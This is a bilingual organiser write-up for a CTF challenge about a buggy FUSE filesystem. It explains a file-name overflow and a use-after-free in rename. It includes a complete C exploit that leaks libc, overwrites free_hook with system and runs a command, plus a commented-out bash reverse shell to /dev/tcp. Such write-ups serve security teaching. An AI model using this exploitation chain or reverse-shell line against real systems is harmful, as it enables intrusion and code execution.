# d3fuse

> 一道简单题，给大家签个到，灵感来自室友充满 bug 的操作系统实验作业
>
> A easy challenge for check-in, inspired by a roommate's bug-filled OS lab assignment.



远程环境构建的时候，ubuntu 20.04 的 libc 还是 Ubuntu GLIBC 2.31-0ubuntu9.2，比赛时选手自己构建的时候 libc 已经是 Ubuntu GLIBC 2.31-0ubuntu9.7 了，造成远程环境和本地环境有差异，对造成影响的选手表示歉意

When the remote environment was built, the libc of ubuntu 20.04 was still `Ubuntu GLIBC 2.31-0ubuntu9.2`, but when the players built it, the libc was already `Ubuntu GLIBC 2.31-0ubuntu9.7`, which caused a difference between the remote environment and the local environment. We apologize to those who were affected by this.



题目是基于 fuse3 写的用户态文件系统，文件系统挂载到了 `/chroot/mnt` 目录下

The challenge is a fuse3-based filesystem mounted at `/chroot/mnt`.



题目的目的是通过利用该文件系统的漏洞，拿到该文件系统程序的权限，对于该题目来说就是为了拿到被 chroot 隔离的 flag

The goal of the challenge is to get the control privileges of the file system program by exploiting the vulnerability of the program, which in this case is to get the flag isolated by chroot.



可以参考 https://github.com/libfuse/libfuse/blob/master/example/hello.c 了解一个 fuse 程序的编写

FUSE programing example: https://github.com/libfuse/libfuse/blob/master/example/hello.c 



参考 [fuse_operations](https://github.com/libfuse/libfuse/blob/master/include/fuse.h#L302) 结构体的定义，可以帮助分析各个文件系统操作

Refer to the definition of the [fuse_operations](https://github.com/libfuse/libfuse/blob/master/include/fuse.h#L302) structure to help analyze the operations.


该题存在两个漏洞：

There are two vulnerabilities:



第一个是文件结构体的文件名长度是固定的，创建文件或目录的时候，通过 strcpy 写入文件名，可以溢出覆盖文件的 size 字段，和指向文件内容的 content 指针

Firstly, When creating a file or directory, the size and the pointer of content can be overwritten by file name

![image-20220307152358196](https://s1.ax1x.com/2022/03/07/bytKc8.png)



第二个是 rename 操作，在重命名文件后，把文件的 content 指针给 free 了，存在 UAF

Secondly, there is a UAF in rename operations

![image-20220307152602592](https://s1.ax1x.com/2022/03/07/byNMP1.png)



题目也关闭了 PIE 降低了利用难度（~~主要是开了 PIE 我没利用成功~~）

PIE is disabled in order to reduce the difficulty of exploitation.



第一个洞可以通过覆盖 content 指针来任意读写，关闭 PIE 的同时也让 GOT 表可写，只要改写 GOT[free] 为 system 即可执行任意命令

On the one hand, you can overwrite the content pointer to achieve arbitrary read/write. Leak address, and then replace `GOT[free]` with the *system* address to execute any command.



第二个洞可以通过 UAF 伪造目录或者文件，控制整个文件结构体，同样可以任意读写

On the other hand, fake directory or file via UAF to control the whole file structure then get ARW



我看了看收上来的 WP，发现选手都用的第一个洞，而且利用起来也很简单，我这里只给出第二个洞的 exp 吧
Many players exploited the first vulnerability and it is very easy, so we only release the exploitation of UAF：

```c
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#define SPRAY_SIZE 0x20

#define OPEN(x, filename, flags) do { \
	files[x] = open(filename, flags); \
	if (files[x] < 0) { \
		perror(filename); \
		exit(-1); \
	} \
} while (0);

#define WRITE(x, off, size) do { \
	if (off != lseek(files[x], off, SEEK_SET)) { \
		perror("lseek"); \
		exit(-2); \
	} \
	if (size != write(files[x], buf, size)) { \
		perror("write"); \
		exit(-2); \
	} \
} while (0);

#define READ(x, off, size) do { \
	if (off != lseek(files[x], off, SEEK_SET)) { \
		perror("lseek"); \
		exit(-3); \
	} \
	if (size != read(files[x], buf, size)) { \
		perror("read"); \
		exit(-3); \
	} \
} while (0);

#define UNLINK(filename) do { \
	if (0 != unlink(filename)) { \
		perror("unlink"); \
		exit(-4); \
	} \
} while (0);

#define TRUNCATE(x, size) do { \
	if (0 != ftruncate(files[x], size)) { \
		perror("truncate"); \
		exit(-5); \
	} \
} while (0);

#define RENAME(a, b) do { \
	if (0 != rename(a, b)) { \
		perror("rename"); \
		exit(-5); \
	} \
} while (0);

#define MKDIR(a) do { \
	if (0 != mkdir(a, 0)) { \
		perror("mkdir"); \
		exit(-6); \
	} \
} while (0);

#define CLOSE(x) do { close(files[x]); } while (0);



int files[1024];
char buf[0x600];
char filename[0x100];
struct stat st;

char *cmd = "cp /flag /chroot/rwdir/flag";
//char *cmd = "bash  -c 'bash -i >& /dev/tcp/ip/port 0>&1' &";

int main()
{
	puts("fill root dir");
	for (int i = 0; i < SPRAY_SIZE+2; i++) {
		sprintf(filename, "/mnt/fill%d", i);
		OPEN(0, filename, O_RDWR | O_CREAT);
		CLOSE(0);
	}

	for (int i = 0; i < SPRAY_SIZE+2; i++) {
		sprintf(filename, "/mnt/fill%d", i);
		UNLINK(filename);
	}

	puts("create uaf");
	OPEN(0, "/mnt/1.txt", O_RDWR | O_CREAT);
	TRUNCATE(0, 0x300);
	CLOSE(0);

	OPEN(0, "/mnt/free.txt", O_RDWR | O_CREAT);
	strcpy(buf, cmd);
	WRITE(0, 0, strlen(buf) + 1);
	CLOSE(0);

	RENAME("/mnt/1.txt", "/mnt/2.txt"); // & uaf
	OPEN(0, "/mnt/2.txt", O_RDWR);

	for (int i = 0; i < SPRAY_SIZE; i++) {
		sprintf(filename, "/mnt/dir%d", i);
		MKDIR(filename);
		sprintf(filename, "/mnt/dir%d/fake_file", i);
		OPEN(i+1, filename, O_RDWR | O_CREAT);
		TRUNCATE(i+1, 0x20);
		CLOSE(i+1);
	}

	READ(0, 0, 0x30); // dir entry
	if (strncmp("fake_file", buf, 9)) {
		puts("failed");
		return 0;
	}

	printf("filename=%s\n", buf);

	*(size_t *)&buf[0x24] = 0x8;  		// size
	*(size_t *)&buf[0x28] = 0x405018;   // content ptr = got['free']
	
	WRITE(0, 0, 0x30); // modify ./mnt/dir/1.txt File Header

	puts("leak libc");
	sleep(1);

	size_t free_ptr;
	int fd = -1;
	for (int i = 0; i < SPRAY_SIZE; i++) {
		sprintf(filename, "/mnt/dir%d/fake_file", i);
		lstat(filename, &st);
		printf("size = %d\n", st.st_size);
		if (st.st_size == 8) {
			fd = 1;
			OPEN(1, filename, O_RDWR);
			break;
		}
	}

	if (fd < 0) {
		puts("libc not found");
		return 0;
	}

	READ(1, 0, 8);
	free_ptr = *(size_t *)&buf[0];

	size_t lbase = free_ptr - 0x9d850;
	size_t system_ptr = lbase + 0x55410;
	size_t free_hook = lbase + 0x1eeb28;
	printf("free = %#lx\n", free_ptr);
	printf("lbase = %#lx\n", lbase);

	puts("content ptr -> free_hook");
	*(size_t *)&buf[0] = free_hook;
	WRITE(0, 0x28, 8);

	puts("set free_hook=system");
	*(size_t *)&buf[0] = system_ptr;
	WRITE(fd, 0, 8);
	
	// free !
	puts("free");
	UNLINK("/mnt/free.txt");
	
	return 0;
}

```

